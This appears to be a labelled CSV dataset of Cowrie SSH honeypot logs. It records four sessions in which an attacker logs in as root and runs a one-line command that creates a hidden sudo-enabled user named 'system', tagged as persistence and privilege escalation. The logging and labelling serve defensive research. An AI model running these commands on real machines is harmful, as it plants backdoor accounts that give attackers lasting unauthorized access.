,event,session_id,session,labels
295,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T08:05:23.410200Z"", ""username"": ""root"", ""session_id"": ""45ce212afa59""}",45ce212afa59,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 PUUWEDMp) system  && sudo usermod -aG sudo system ; openssl passwd -1 PUUWEDMp;,"['Initial access', 'Persistence', 'Privilege escalation']"
296,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T08:05:23.635760Z"", ""session_id"": ""45ce212afa59""}",45ce212afa59,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 PUUWEDMp) system  && sudo usermod -aG sudo system ; openssl passwd -1 PUUWEDMp;,"['Initial access', 'Persistence', 'Privilege escalation']"
297,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 PUUWEDMp) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 PUUWEDMp) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T08:05:23.636126Z"", ""session_id"": ""45ce212afa59""}",45ce212afa59,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 PUUWEDMp) system  && sudo usermod -aG sudo system ; openssl passwd -1 PUUWEDMp;,"['Initial access', 'Persistence', 'Privilege escalation']"
298,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 PUUWEDMp"", ""message"": ""CMD: openssl passwd -1 PUUWEDMp"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T08:05:23.636582Z"", ""session_id"": ""45ce212afa59""}",45ce212afa59,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 PUUWEDMp) system  && sudo usermod -aG sudo system ; openssl passwd -1 PUUWEDMp;,"['Initial access', 'Persistence', 'Privilege escalation']"
299,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 PUUWEDMp"", ""message"": ""Command not found: openssl passwd -1 PUUWEDMp"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T08:05:23.637197Z"", ""session_id"": ""45ce212afa59""}",45ce212afa59,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 PUUWEDMp) system  && sudo usermod -aG sudo system ; openssl passwd -1 PUUWEDMp;,"['Initial access', 'Persistence', 'Privilege escalation']"
300,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/d9e97aee17fad155695a5bfe16200348b854d7ea96dc7932596f6708284bfe3d after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""d9e97aee17fad155695a5bfe16200348b854d7ea96dc7932596f6708284bfe3d"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T08:05:23.742098Z"", ""ttylog"": ""var/lib/cowrie/tty/d9e97aee17fad155695a5bfe16200348b854d7ea96dc7932596f6708284bfe3d"", ""session_id"": ""45ce212afa59""}",45ce212afa59,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 PUUWEDMp) system  && sudo usermod -aG sudo system ; openssl passwd -1 PUUWEDMp;,"['Initial access', 'Persistence', 'Privilege escalation']"
301,"{""duration"": ""1.0"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 1.0 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T08:05:23.742907Z"", ""session_id"": ""45ce212afa59""}",45ce212afa59,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 PUUWEDMp) system  && sudo usermod -aG sudo system ; openssl passwd -1 PUUWEDMp;,"['Initial access', 'Persistence', 'Privilege escalation']"
302,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:36266 (10.42.4.33:2222) [session: c3c69ed4b6c3]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 36266.0, ""timestamp"": ""2025-08-08T13:30:33.900116Z"", ""session_id"": ""c3c69ed4b6c3""}",c3c69ed4b6c3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 WPDYSaqX) system  && sudo usermod -aG sudo system ; openssl passwd -1 WPDYSaqX;,"['Initial access', 'Persistence', 'Privilege escalation']"
303,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T13:30:33.900510Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""c3c69ed4b6c3""}",c3c69ed4b6c3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 WPDYSaqX) system  && sudo usermod -aG sudo system ; openssl passwd -1 WPDYSaqX;,"['Initial access', 'Persistence', 'Privilege escalation']"
304,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T13:30:34.053456Z"", ""session_id"": ""c3c69ed4b6c3""}",c3c69ed4b6c3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 WPDYSaqX) system  && sudo usermod -aG sudo system ; openssl passwd -1 WPDYSaqX;,"['Initial access', 'Persistence', 'Privilege escalation']"
305,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T13:30:34.535066Z"", ""username"": ""root"", ""session_id"": ""c3c69ed4b6c3""}",c3c69ed4b6c3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 WPDYSaqX) system  && sudo usermod -aG sudo system ; openssl passwd -1 WPDYSaqX;,"['Initial access', 'Persistence', 'Privilege escalation']"
306,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T13:30:34.760571Z"", ""session_id"": ""c3c69ed4b6c3""}",c3c69ed4b6c3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 WPDYSaqX) system  && sudo usermod -aG sudo system ; openssl passwd -1 WPDYSaqX;,"['Initial access', 'Persistence', 'Privilege escalation']"
307,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 WPDYSaqX) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 WPDYSaqX) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T13:30:34.760935Z"", ""session_id"": ""c3c69ed4b6c3""}",c3c69ed4b6c3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 WPDYSaqX) system  && sudo usermod -aG sudo system ; openssl passwd -1 WPDYSaqX;,"['Initial access', 'Persistence', 'Privilege escalation']"
308,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 WPDYSaqX"", ""message"": ""CMD: openssl passwd -1 WPDYSaqX"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T13:30:34.761454Z"", ""session_id"": ""c3c69ed4b6c3""}",c3c69ed4b6c3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 WPDYSaqX) system  && sudo usermod -aG sudo system ; openssl passwd -1 WPDYSaqX;,"['Initial access', 'Persistence', 'Privilege escalation']"
309,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 WPDYSaqX"", ""message"": ""Command not found: openssl passwd -1 WPDYSaqX"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T13:30:34.762085Z"", ""session_id"": ""c3c69ed4b6c3""}",c3c69ed4b6c3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 WPDYSaqX) system  && sudo usermod -aG sudo system ; openssl passwd -1 WPDYSaqX;,"['Initial access', 'Persistence', 'Privilege escalation']"
310,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/1199719133cf1fda60c99842299648ac5964d34b29fc247cb364028b0644648f after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""1199719133cf1fda60c99842299648ac5964d34b29fc247cb364028b0644648f"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T13:30:34.867020Z"", ""ttylog"": ""var/lib/cowrie/tty/1199719133cf1fda60c99842299648ac5964d34b29fc247cb364028b0644648f"", ""session_id"": ""c3c69ed4b6c3""}",c3c69ed4b6c3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 WPDYSaqX) system  && sudo usermod -aG sudo system ; openssl passwd -1 WPDYSaqX;,"['Initial access', 'Persistence', 'Privilege escalation']"
311,"{""duration"": ""1.0"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 1.0 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T13:30:34.867733Z"", ""session_id"": ""c3c69ed4b6c3""}",c3c69ed4b6c3,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 WPDYSaqX) system  && sudo usermod -aG sudo system ; openssl passwd -1 WPDYSaqX;,"['Initial access', 'Persistence', 'Privilege escalation']"
312,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:12133 (10.42.6.15:2222) [session: b1dee11cfb39]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 12133.0, ""timestamp"": ""2025-08-08T07:57:05.876828Z"", ""session_id"": ""b1dee11cfb39""}",b1dee11cfb39,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wUJYKjeR) system  && sudo usermod -aG sudo system ; openssl passwd -1 wUJYKjeR;,"['Initial access', 'Persistence', 'Privilege escalation']"
313,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T07:57:05.878317Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""b1dee11cfb39""}",b1dee11cfb39,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wUJYKjeR) system  && sudo usermod -aG sudo system ; openssl passwd -1 wUJYKjeR;,"['Initial access', 'Persistence', 'Privilege escalation']"
314,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T07:57:05.883589Z"", ""session_id"": ""b1dee11cfb39""}",b1dee11cfb39,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wUJYKjeR) system  && sudo usermod -aG sudo system ; openssl passwd -1 wUJYKjeR;,"['Initial access', 'Persistence', 'Privilege escalation']"
315,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T07:57:05.903320Z"", ""username"": ""root"", ""session_id"": ""b1dee11cfb39""}",b1dee11cfb39,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wUJYKjeR) system  && sudo usermod -aG sudo system ; openssl passwd -1 wUJYKjeR;,"['Initial access', 'Persistence', 'Privilege escalation']"
316,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T07:57:06.104582Z"", ""session_id"": ""b1dee11cfb39""}",b1dee11cfb39,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wUJYKjeR) system  && sudo usermod -aG sudo system ; openssl passwd -1 wUJYKjeR;,"['Initial access', 'Persistence', 'Privilege escalation']"
317,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 wUJYKjeR) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 wUJYKjeR) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T07:57:06.105279Z"", ""session_id"": ""b1dee11cfb39""}",b1dee11cfb39,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wUJYKjeR) system  && sudo usermod -aG sudo system ; openssl passwd -1 wUJYKjeR;,"['Initial access', 'Persistence', 'Privilege escalation']"
318,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 wUJYKjeR"", ""message"": ""CMD: openssl passwd -1 wUJYKjeR"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T07:57:06.105877Z"", ""session_id"": ""b1dee11cfb39""}",b1dee11cfb39,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wUJYKjeR) system  && sudo usermod -aG sudo system ; openssl passwd -1 wUJYKjeR;,"['Initial access', 'Persistence', 'Privilege escalation']"
319,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 wUJYKjeR"", ""message"": ""Command not found: openssl passwd -1 wUJYKjeR"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T07:57:06.106588Z"", ""session_id"": ""b1dee11cfb39""}",b1dee11cfb39,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wUJYKjeR) system  && sudo usermod -aG sudo system ; openssl passwd -1 wUJYKjeR;,"['Initial access', 'Persistence', 'Privilege escalation']"
320,"{""duplicate"": false, ""duration"": ""0.0"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/4231b6f328541856fcb2c6faabfb99e5710875c760e5dfb9c4cd51eb966ac070 after 0.0 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""4231b6f328541856fcb2c6faabfb99e5710875c760e5dfb9c4cd51eb966ac070"", ""size"": 154.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T07:57:06.112846Z"", ""ttylog"": ""var/lib/cowrie/tty/4231b6f328541856fcb2c6faabfb99e5710875c760e5dfb9c4cd51eb966ac070"", ""session_id"": ""b1dee11cfb39""}",b1dee11cfb39,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wUJYKjeR) system  && sudo usermod -aG sudo system ; openssl passwd -1 wUJYKjeR;,"['Initial access', 'Persistence', 'Privilege escalation']"
321,"{""duration"": ""0.2"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.2 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T07:57:06.113715Z"", ""session_id"": ""b1dee11cfb39""}",b1dee11cfb39,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wUJYKjeR) system  && sudo usermod -aG sudo system ; openssl passwd -1 wUJYKjeR;,"['Initial access', 'Persistence', 'Privilege escalation']"
322,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:8332 (10.42.4.33:2222) [session: e727afe0e8ab]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 8332.0, ""timestamp"": ""2025-08-09T21:47:22.314992Z"", ""session_id"": ""e727afe0e8ab""}",e727afe0e8ab,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 uDavXcHP) system  && sudo usermod -aG sudo system ; openssl passwd -1 uDavXcHP;,"['Initial access', 'Persistence', 'Privilege escalation']"
323,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T21:47:22.315701Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""e727afe0e8ab""}",e727afe0e8ab,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 uDavXcHP) system  && sudo usermod -aG sudo system ; openssl passwd -1 uDavXcHP;,"['Initial access', 'Persistence', 'Privilege escalation']"
324,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T21:47:22.406899Z"", ""session_id"": ""e727afe0e8ab""}",e727afe0e8ab,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 uDavXcHP) system  && sudo usermod -aG sudo system ; openssl passwd -1 uDavXcHP;,"['Initial access', 'Persistence', 'Privilege escalation']"
325,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T21:47:22.684995Z"", ""username"": ""root"", ""session_id"": ""e727afe0e8ab""}",e727afe0e8ab,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 uDavXcHP) system  && sudo usermod -aG sudo system ; openssl passwd -1 uDavXcHP;,"['Initial access', 'Persistence', 'Privilege escalation']"
326,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T21:47:23.362133Z"", ""session_id"": ""e727afe0e8ab""}",e727afe0e8ab,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 uDavXcHP) system  && sudo usermod -aG sudo system ; openssl passwd -1 uDavXcHP;,"['Initial access', 'Persistence', 'Privilege escalation']"
327,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 uDavXcHP) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 uDavXcHP) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T21:47:23.362485Z"", ""session_id"": ""e727afe0e8ab""}",e727afe0e8ab,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 uDavXcHP) system  && sudo usermod -aG sudo system ; openssl passwd -1 uDavXcHP;,"['Initial access', 'Persistence', 'Privilege escalation']"
328,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 uDavXcHP"", ""message"": ""CMD: openssl passwd -1 uDavXcHP"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T21:47:23.362944Z"", ""session_id"": ""e727afe0e8ab""}",e727afe0e8ab,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 uDavXcHP) system  && sudo usermod -aG sudo system ; openssl passwd -1 uDavXcHP;,"['Initial access', 'Persistence', 'Privilege escalation']"
329,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 uDavXcHP"", ""message"": ""Command not found: openssl passwd -1 uDavXcHP"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T21:47:23.363566Z"", ""session_id"": ""e727afe0e8ab""}",e727afe0e8ab,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 uDavXcHP) system  && sudo usermod -aG sudo system ; openssl passwd -1 uDavXcHP;,"['Initial access', 'Persistence', 'Privilege escalation']"
